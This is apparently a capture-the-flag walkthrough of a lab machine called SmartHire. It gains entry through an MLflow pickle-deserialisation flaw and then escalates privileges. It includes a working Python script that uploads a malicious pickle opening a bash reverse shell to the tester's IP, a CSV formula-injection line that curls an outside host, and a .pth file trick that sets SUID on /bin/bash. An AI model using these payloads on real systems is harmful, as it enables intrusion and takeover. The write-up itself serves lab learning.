### Nmap
```
nmap -sV -sC -vv 10.129.44.127

---OUTPUT---
Nmap scan report for 10.129.44.127
Host is up, received echo-reply ttl 63 (0.020s latency).
Scanned at 2026-05-20 07:36:57 EDT for 9s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 41:3c:e3:bb:88:70:99:7f:b8:96:59:48:9b:85:98:69 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLg1Y2xxe0euIHDjjKTIrxL+XZXgsBabs0FMAMKBL8arUuELui3vhlkgcDVGcZ4vFWnsiu4osw5INjfcQGkp2BY=
|   256 d5:9d:fd:6b:be:d8:39:6f:3f:43:ab:0e:f6:3e:22:db (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPc/kqsR+WxwGPMNTukcYPjzZRGjQL6N+0HsGIS1NV4U
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://smarthire.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[Pasted image 20260520073836.png]]

![[Pasted image 20260520073909.png]]


- I register a new account:
![[Pasted image 20260520074002.png]]

- Logging in shows a dashboard where I can upload CSV training data:
![[Pasted image 20260520074041.png]]
- Under Mre Predictions we can then upload a resume for it to read an analyze based on the training data csv we upload earlier.
![[Pasted image 20260520074139.png]]

### Ffuf 
- Reveals subdomain `models`:
```
ffuf -u http://smarthire.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt   -H "Host:FUZZ.smarthire.htb" -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://smarthire.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.smarthire.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

models                  [Status: 401, Size: 137, Words: 11, Lines: 1, Duration: 31ms]
:: Progress: [20481/20481] :: Job [1/1] :: 1886 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```
![[Pasted image 20260520080527.png]]

- Accessing it shows an application `MLFlow`L
![[Pasted image 20260520080801.png]]

- Looking online we find a CVE for this: CVE-2024-37054
https://github.com/NiteeshPujari/CVE-2024-37054-MLflow-RCE

- In MLFlow we also see a run_id value. Initially based off of the `log_malicious_payload` script i modofied it (with claude) to get an exploit that creates a model. however it is created under a random name. so when we try to trigger itm it doesnt use the model with our payload.

- Instead, we can create a test model via SmartHire website and find the run id in mlflow:
- Can upload any model with the right format (use the example). i was trying other stuff so this is my test model:
```
cat test.csv              
name,skills,experience,education,position_applied,previous_company
=cmd|'/bin/bash -c "curl http://10.10.16.41:9999/$(whoami)"'!A1,"Python",60,BSc,Engineer,Google

```

![[Pasted image 20260521074446.png]]

- The in MLFlow grab the run_id :
![[Pasted image 20260521074528.png]]

![[Pasted image 20260521074619.png]]

(http://models.smarthire.htb/#/experiments/0/runs/09d6edc40cb448d19f8c836aceaf96b4)

- Now we need to modify this model to our exploit. FIrst we need to understand the exploit more.
- First PyFunc model can be injected to run malicious code. So we upload a model and this model should be able to run malicious code.

- Reference https://sca.analysiscenter.veracode.com/vulnerability-database/security/1/1/sid-47546/summary
```
mlflow is vulnerable to Deserialization of Untrusted Data. The vulnerability is caused due to improper handling of serialized data in the `_load_pyfunc` function within `mlflow/pyfunc/model.py`. This flaw allows an attacker to inject a malicious pickle object into a PyFunc model file, which results in arbitrary code execution.
```

- looking online for mlflow pickle https://mlflow.org/docs/latest/api_reference/python_api/mlflow.pyfunc.html
```
The python_function model flavor serves as a default model interface for MLflow Python models. Any MLflow Python model is expected to be loadable as a python_function model.


model_uri –

The location, in URI format, of the MLflow model with the mlflow.pyfunc flavor. For example:

/Users/me/path/to/local/model

relative/path/to/local/model

s3://my_bucket/path/to/model

runs:/<mlflow_run_id>/run-relative/path/to/model

models:/<model_name>/<model_version>

models:/<model_name>/<stage>

mlflow-artifacts:/path/to/model
```

- So we need to find the path of the model as the model we upload is read and the data is out into the default model location
- When clicking on the version number of the model in MLFlow we catch it in burpsuite
![[Pasted image 20260521091137.png]]
![[Pasted image 20260521091237.png]]

- Sending it to repeat I remove this:
```
If-Modified-Since: Thu, 21 May 2026 11:44:28 GMT
If-None-Match: "1779363868.9882104-464-2882869550"
```

- I get a response telling me the python model name:
![[Pasted image 20260521091357.png]]

```
REQUEST:

GET /model-versions/get-artifact?path=MLmodel&name=test-3853b1dd519b-model&version=5 HTTP/1.1
Host: models.smarthire.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://models.smarthire.htb/
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Connection: keep-alive
Priority: u=0


---OUTPUT RESPOSNE---
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 21 May 2026 13:10:34 GMT
Content-Type: text/plain
Content-Length: 464
Connection: keep-alive
Content-Disposition: attachment; filename=MLmodel
Last-Modified: Thu, 21 May 2026 11:44:28 GMT
Cache-Control: no-cache
ETag: "1779363868.9882104-464-2882869550"
X-Content-Type-Options: nosniff

artifact_path: model
flavors:
  python_function:
    cloudpickle_version: 3.1.1
    code: null
    env:
      conda: conda.yaml
      virtualenv: python_env.yaml
    loader_module: mlflow.pyfunc.model
    python_model: python_model.pkl
    python_version: 3.10.12
    streamable: false
mlflow_version: 2.14.1
model_size_bytes: 258
model_uuid: 405db5d4adb24a7198487fe43e452b27
run_id: 09d6edc40cb448d19f8c836aceaf96b4
utc_time_created: '2026-05-21 11:44:27.129550'

```

- We see the model anme is python_model.pkl
 Next to find the source. in one of our requests we see the path in the response:
![[Pasted image 20260521092631.png]]
```
REQUEST:
GET /ajax-api/2.0/mlflow/model-versions/get?name=test-3853b1dd519b-model&version=5 HTTP/1.1
Host: models.smarthire.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://models.smarthire.htb/
Content-Type: application/json; charset=utf-8
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Connection: keep-alive
Priority: u=4


---RESPONSE_--
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 21 May 2026 13:25:13 GMT
Content-Type: application/json
Content-Length: 403
Connection: keep-alive

{
  "model_version": {
    "name": "test-3853b1dd519b-model",
    "version": "5",
    "creation_timestamp": 1779363872609,
    "last_updated_timestamp": 1779368075711,
    "current_stage": "None",
    "description": "",
    "source": "mlflow-artifacts:/0/09d6edc40cb448d19f8c836aceaf96b4/artifacts/model",
    "run_id": "09d6edc40cb448d19f8c836aceaf96b4",
    "status": "READY",
    "run_link": ""
  }
}
```

- The path is `mlflow-artifacts:/0/09d6edc40cb448d19f8c836aceaf96b4/artifacts/model`
	- or full path : `/ajax-api/2.0/mlflow-artifacts:/0/09d6edc40cb448d19f8c836aceaf96b4/artifacts/model/python_model.pkl`
- With this we can now execute our payload onto the model its being used and alter it to send a shell to our machine:
- Payload.py
```
cat payload.py 
import requests
import cloudpickle
import os

run_id = "09d6edc40cb448d19f8c836aceaf96b4"
MLFLOW = "http://admin:password@models.smarthire.htb"

class Exploit:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.16.41/9999 0>&1"'
        return (os.system, (cmd,))

pkl_bytes = cloudpickle.dumps(Exploit())

url = f"{MLFLOW}/api/2.0/mlflow-artifacts/artifacts/0/{run_id}/artifacts/model/python_model.pkl"
r = requests.put(url, 
    headers={"Content-Type": "application/octet-stream"},
    data=pkl_bytes,
    auth=("admin", "password")
)
print(r.status_code, r.text)
```

- Executing it we get a 200 response implying success:
```
sudo python3.11 payload2.py                             
200 {}
```

- We can then trigger it by uploading a csv file for prediction which then triggers the model:
![[Pasted image 20260521093143.png]]

- This triggers the exploit and we get a shell on our listener:
![[Pasted image 20260521093210.png]]

- I grab the user flag:
![[Pasted image 20260521093307.png]]
```
cat user.txt
317e116ded5a863ce3bf795f2e627b5e
```
### Privilege Escalation
- checking sudo privileges we can run a command:
```
sudo -l

---OUTPUT_--
Matching Defaults entries for svcweb on smarthire:                                                                           
    env_reset,                                                                                                               
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,                                           
    use_pty                                                                                                                  
                                                                                                                             
User svcweb may run the following commands on smarthire:                                                                     
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

- Reading mlflowctl.py it talks of 3 commands, status, restart and backup
- initially I checked /opt/tools/mlflow_ctl/plugins permissions and group dev can modify it:
```
bash-5.1$ pwd
pwd
/opt/tools/mlflow_ctl/plugins


bash-5.1$ ls -al
ls -al
total 16
drwxr-xr-x 4 root root 4096 Feb 19 18:10 .
drwxr-xr-x 3 root root 4096 Feb 19 18:16 ..
drwxr-xr-x 3 root root 4096 Feb 20 09:26 core
drwxrwxr-x 2 root devs 4096 May 21 09:54 dev
```

- Checking our id we are part of that group:
```
id

uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```
![[Pasted image 20260521095545.png]]

- in `dev` I can edit backup_models.py
![[Pasted image 20260521095625.png]]

- So initially I changed this model to my payload:
```
cat > /opt/tools/mlflow_ctl/plugins/dev/backup_models.py << 'EOF'
import os

def run():
    os.system("chmod +s /bin/bash")
EOF
```

- But when running the sudo command another code is executed as the output seems different:
```
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py backup-models
<10 /opt/tools/mlflow_ctl/mlflowctl.py backup-models
[*] Running backup via backup_models plugin...
Backup successful: /var/backups/mlflow-backup/mlruns_backup_20260521095105.tar.gz
```

- So a different back_models.py is being executed. Looking at where the dev folder is located there is also a core folder which also has a backup_models.py but ofcourse we cant modify it:
![[Pasted image 20260521095922.png]]

- However we do see a `__pycache__ ` folder. This is what decides which path is used first. To bypass this we could use a pth exploit as pth files are read first and whatever is written to import is done first avoiding the race to run the code.

- We create evil.pth in dev folder:
```
cat > /opt/tools/mlflow_ctl/plugins/dev/evil.pth << 'EOF'
import os; os.system("chmod +s /bin/bash")
EOF
```

- Then we can run any command from mlflow to trigger it:
```
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status


<ython3.10 /opt/tools/mlflow_ctl/mlflowctl.py status 
[*] Checking MLflow service status...

[+] MLflow service status: active
[+] MLflow container status: 'Up 2 hours'
```

- now we can check bash permissions to ocnfirm:
```
 ls -la /bin/bash

-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

- We see the s alphabet showing suid privileges.

- We can run it to be root:
```
bash -p
```
![[Pasted image 20260521100502.png]]

- I can grab the root flag:
![[Pasted image 20260521101113.png]]
```
cat root.txt
6b986975529bbd6fc6e6bdf37f0d4893
```